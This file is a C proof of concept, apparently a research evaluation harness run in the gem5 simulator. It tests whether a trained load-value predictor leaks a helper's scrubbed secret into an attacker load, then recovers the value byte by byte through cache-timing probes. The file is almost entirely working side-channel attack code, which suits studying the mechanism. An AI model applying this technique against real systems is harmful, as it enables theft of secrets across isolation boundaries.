/*
 * Layer 4 — Mode 1 PoC: 1-shot in-flight SpecGVQ value teleportation.
 *
 * Threat model (single core, same address space):
 *   - A trusted, branchless helper reads a 64-bit value, uses it in registers,
 *     and explicitly scrubs the architectural register before returning.  It
 *     has no data-dependent branch and no data-dependent memory access, so a
 *     branch-misprediction gadget and a local (constant) predictor cannot
 *     extract anything.
 *   - The experimenter's own load `L_atk` is trained so that its predicted
 *     value is "the value of the load one position earlier, + 0".
 *   - When L_atk is executed immediately after the helper returns, the model
 *     predicts `x + 0` from the helper's load and forwards it into L_atk's
 *     destination register.
 *
 * Mechanic details that matter:
 *   - Same static load PC in training and measurement (`atk_load`).
 *   - d = 1: the base load is the immediately preceding dynamic load.
 *   - Training uses pairs, so the difference is constant ONLY at d = 1;
 *     distance polling therefore lands on 1 rather than locking on a
 *     self-distance.
 *   - Built -fno-pic -no-pie, and the array base is passed as an argument, so
 *     addressing a global never inserts a hidden load between the helper's
 *     load and L_atk (which would become the prediction base).
 *   - L_atk's address is derived from register-only divisions (no loads), so
 *     the load issues long after its prediction was injected; the dependent
 *     probe load therefore issues with the predicted value while verification
 *     (and the squash) is still far away.
 *   - After training, atk_buf[0] is set to a sentinel by a plain store (which
 *     does not train the predictor).  The post-squash architectural
 *     re-execution then fills the sentinel's probe line; that line is the
 *     per-attempt *calibration* line, not a vote.
 *
 * ---------------------------------------------------------------------------
 * Estimator (rewritten; see experiment/egdiff_eval/RESULTS_step1.md)
 * ---------------------------------------------------------------------------
 * The naive estimator ("vote for the single fastest of 256 lines") is broken
 * in a way that has nothing to do with the predictor: on an attempt where the
 * speculative fill did NOT happen, all 256 lines are cold misses and the
 * minimum is a pure noise draw from the miss-latency distribution.  That noise
 * minimum is *not* uniformly distributed — it lands on the second line of the
 * scan essentially every time (114 cycles vs ~120 for the rest), so a byte
 * with no leak is reported as 0x01, and the artifact follows the value around.
 *
 * Measurements in gem5 (deterministic):
 *   hot (speculatively filled) line   : 14 cycles
 *   cold (evicted) line               : ~114-142 cycles, mean ~120
 *   architectural sentinel line       : 14 cycles (always, it is re-executed)
 *
 * So each attempt is classified instead of blindly voting:
 *   1. The architectural sentinel line is the *calibration* reference: it must
 *      be fast (the attack suffix really did re-execute), and its latency plus
 *      the mean cold latency of the other 255 lines define a per-attempt
 *      threshold `thresh = (t_arch + t_cold) / 2`.
 *   2. A vote is cast only when *exactly one* non-sentinel line is below
 *      `thresh` (i.e. it is clearly a hit and clearly the only hit).  Zero
 *      fast lines = "no leak this attempt"; two or more = "ambiguous"; both
 *      cast no vote.
 *   3. The sentinel value alternates between two constants whose byte at every
 *      position differs (0xA5 .. / 0x5A ..).  The sentinel line is therefore
 *      excluded from the vote per attempt without ever excluding a *value*:
 *      a secret byte equal to the sentinel byte is still measured on the
 *      attempts that use the other sentinel.  (The old harness excluded the
 *      single line 0xAA globally, so any 0xAA byte was structurally
 *      unrecoverable.)
 *   4. The winner needs at least MIN_VOTES votes.  A byte with no winner is
 *      reported as *unknown* (`known` bit clear) rather than fabricated: the
 *      harness never claims a byte it did not measure.
 *
 * One more defect was found and fixed: the eviction loop runs far ahead of the
 * attack, so its last misses still held all four L1D MSHRs when the transient
 * probe tried to issue; the probe then stalled until the squash and no fill
 * happened at all.  A `fence.i` between the eviction and the victim call (i.e.
 * outside the transient window) drains the eviction.  Without it the same
 * binary leaks on 1/128 attempts; with it, on 127/128.
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define LINES      256
#define LINE       64
#define PROBE_SZ   (LINES * LINE)
#define TRAIN      400
#ifndef REPS
#define REPS       16          /* attempts per byte; sentinel alternates */
#endif
#ifndef ATK_DIVS
#define ATK_DIVS   12          /* register-only address-delay divisions */
#endif
#ifndef PROBE_DELAY
#define PROBE_DELAY 0          /* dependent-probe issue delay in instructions */
#endif
#define MIN_VOTES  2
#define FLUSH_SZ   (128 * 1024)

/* Two architectural sentinels whose bytes differ at every position. */
#define SENT0      0xA5A5A5A5A5A5A5A5ULL
#define SENT1      0x5A5A5A5A5A5A5A5AULL

static uint8_t probe[PROBE_SZ] __attribute__((aligned(LINE)));
static volatile uint64_t pair_arr[TRAIN];
static volatile uint64_t atk_buf[64];

static volatile uint8_t flushbuf[FLUSH_SZ];

static inline uint64_t
rdcycle(void)
{
    uint64_t c;
    asm volatile("csrrs %0, cycle, x0" : "=r"(c) :: "memory");
    return c;
}

static void
flush_l1(void)
{
    for (int i = 0; i < FLUSH_SZ; i += LINE)
        (void)flushbuf[i];
}

/* The eviction loop above is a stream of independent loads, so the OoO core
 * happily runs the whole attack while the last few dozen cache misses of the
 * eviction are still outstanding.  Those misses hold every L1D MSHR, so the
 * transient probe load's request cannot be sent before the squash arrives and
 * the line is never filled -- the leak silently disappears, in a way that
 * depends on instruction scheduling.  (Measured: 127/128 attempts leak with
 * this instruction and 1/128 without it, on an otherwise identical binary.)
 *
 * A serialising fence between the eviction and the victim call removes the
 * race: it is *outside* the transient window (it precedes the victim call), so
 * it changes nothing about the mechanism being measured -- it only guarantees
 * that "the probe area is cold" is actually true when the attack runs.  An
 * attacker who wants the eviction to have landed can and would do the same. */
static inline void
flush_drain(void)
{
    asm volatile("fence.i" ::: "memory");
}

/* Timed read of one probe line. */
static inline uint64_t
time_line(int k)
{
    volatile uint8_t *q = probe + (size_t)k * LINE;
    uint64_t t1 = rdcycle();
    uint8_t v = *q;
    asm volatile("" :: "r"(v) : "memory");
    return rdcycle() - t1;
}

/* The experimenter's own load.  One static PC, used for training and for the
 * measurement.  The base pointer is passed in so that addressing a global
 * never inserts a hidden load. */
__attribute__((noinline, noclone))
static uint64_t
atk_load(volatile uint64_t *base, uint64_t idx)
{
    return base[idx & 63];
}

/* The target value and the helpers live in a separate translation unit
 * (egdiff_secret.c) so this file has no architectural reference to the value
 * it is supposed to obtain. */
extern uint64_t victim_value(uint64_t token);
extern int oracle_report_v1(uint64_t recovered, uint64_t known_mask,
                            uint64_t sink);

static uint64_t
mix(uint64_t x)
{
    x += 0x9E3779B97F4A7C15ULL;
    x = (x ^ (x >> 30)) * 0xBF58476D1CE4E5B9ULL;
    x = (x ^ (x >> 27)) * 0x94D049BB133111EBULL;
    return x ^ (x >> 31);
}

int
main(void)
{
    for (int i = 0; i < TRAIN; i++)
        pair_arr[i] = mix((uint64_t)i + 0x51ED);
    memset(probe, 0, sizeof(probe));

    uint64_t sink = 0;
    uint64_t recovered = 0;
    uint64_t known = 0;
    uint64_t lat[LINES];

    for (int b = 0; b < 8; b++) {
        int votes[LINES];
        for (int k = 0; k < LINES; k++)
            votes[k] = 0;

        int n_vote = 0;     /* attempts that produced exactly one clear hit */
        int n_archonly = 0; /* attempts where only the sentinel line was fast */
        int n_ambig = 0;    /* attempts with two or more fast lines        */
        int n_invalid = 0;  /* attempts with no usable hit/miss separation  */

        for (int attempt = 0; attempt < REPS; attempt++) {
            uint64_t sent = (attempt & 1) ? SENT1 : SENT0;
            int arch = (int)((sent >> (8 * b)) & 0xff);

            /* ---- 1. Offline training: only d = 1 has a constant diff ---- */
            for (int i = 0; i < TRAIN; i++) {
                uint64_t p = pair_arr[i];
                atk_buf[0] = p;               /* store: no effect on order */
                sink += atk_load(atk_buf, 0); /* L_atk: value == prior load */
            }

            /* Freeze the architectural value to a known sentinel without
             * perturbing the trained entry (a store, not a load). */
            atk_buf[0] = sent;

            /* ---- 2. Evict the probe array and the attack buffer ---- */
            flush_l1();
            flush_drain();

            /* ---- 3. Helper executes exactly once ---- */
            uint64_t ok = victim_value(0);

            /* ---- 4. Delay L_atk's address using register-only divisions ----
             * No constants, so nothing spills/reloads between the helper's
             * load and L_atk (a reload would become the prediction base). */
            uint64_t x = ok | 1;
#if ATK_DIVS >= 1
            x /= (ok + 2);
#endif
#if ATK_DIVS >= 2
            x /= (ok + 3);
#endif
#if ATK_DIVS >= 3
            x /= (ok + 4);
#endif
#if ATK_DIVS >= 4
            x /= (ok + 5);
#endif
#if ATK_DIVS >= 5
            x /= (ok + 6);
#endif
#if ATK_DIVS >= 6
            x /= (ok + 7);
#endif
#if ATK_DIVS >= 7
            x /= (ok + 8);
#endif
#if ATK_DIVS >= 8
            x /= (ok + 9);
#endif
#if ATK_DIVS >= 9
            x /= (ok + 10);
#endif
#if ATK_DIVS >= 10
            x /= (ok + 11);
#endif
#if ATK_DIVS >= 11
            x /= (ok + 12);
#endif
#if ATK_DIVS >= 12
            x /= (ok + 13);
#endif

            /* ---- 5. L_atk; predicted value = helper's value + 0 ---- */
            uint64_t val = atk_load(atk_buf, x);
            sink += val;

            /* ---- 6. Encode the selected byte through the cache ---- */
            uint64_t bi = (val >> (8 * b)) & 0xff;
#if PROBE_DELAY >= 1
            asm volatile("addi %0, %0, 0" : "+r"(bi));
#endif
#if PROBE_DELAY >= 2
            asm volatile("addi %0, %0, 0" : "+r"(bi));
#endif
#if PROBE_DELAY >= 3
            asm volatile("addi %0, %0, 0" : "+r"(bi));
#endif
#if PROBE_DELAY >= 4
            asm volatile("addi %0, %0, 0" : "+r"(bi));
#endif
#if PROBE_DELAY >= 5
            asm volatile("addi %0, %0, 0" : "+r"(bi));
#endif
            volatile uint8_t *pp = probe + bi * LINE;
            (void)*pp;

            /* ---- 7. Measure every line, including the sentinel line ---- */
            uint64_t sum = 0;
            for (int k = 0; k < LINES; k++) {
                lat[k] = time_line(k);
                sum += lat[k];
            }

            /* Per-attempt calibration: the re-executed (architectural) probe
             * fills the sentinel line, so it is a known-hot reference. */
            uint64_t t_arch = lat[arch];
            uint64_t t_cold = (sum - t_arch) / (LINES - 1);
            uint64_t thresh = t_arch + (t_cold - t_arch) / 2;

            if (t_arch * 4 >= t_cold) {
                /* The hot/cold gap collapsed: the cache was not cold or the
                 * suffix did not re-execute.  The attempt carries no
                 * information. */
                n_invalid++;
                continue;
            }

            int cand = -1;
            int ncand = 0;
            for (int k = 0; k < LINES; k++) {
                if (k == arch || lat[k] >= thresh)
                    continue;
                ncand++;
                if (cand < 0 || lat[k] < lat[cand])
                    cand = k;
            }

            if (ncand == 0) {
                /* Only the architectural sentinel line was fast.  Either the
                 * speculative fill did not happen, or the secret byte equals
                 * this attempt's sentinel byte (recovered from the other
                 * sentinel's attempts). */
                n_archonly++;
            } else if (ncand == 1) {
                votes[cand]++;
                n_vote++;
            } else {
                n_ambig++;
            }
        }

        /* ---- Decide this byte from the accumulated votes ---- */
        int win = -1;
        for (int k = 0; k < LINES; k++)
            if (win < 0 || votes[k] > votes[win])
                win = k;

        int runner = 0;
        if (win >= 0) {
            for (int k = 0; k < LINES; k++)
                if (k != win && votes[k] > runner)
                    runner = votes[k];
        }

        int ok_byte = (win >= 0 && votes[win] >= MIN_VOTES &&
                       votes[win] >= 2 * runner);

        if (ok_byte) {
            recovered |= ((uint64_t)(uint8_t)win) << (8 * b);
            known |= 1ULL << b;
        }

        printf("byte %d: %s=0x%02x votes=%d runnerup=%d "
               "voted=%d sentinel_only=%d ambiguous=%d invalid=%d\n",
               b, ok_byte ? "got" : "UNKNOWN",
               ok_byte ? win : 0, ok_byte ? votes[win] : 0, runner,
               n_vote, n_archonly, n_ambig, n_invalid);
    }

    return oracle_report_v1(recovered, known, sink);
}
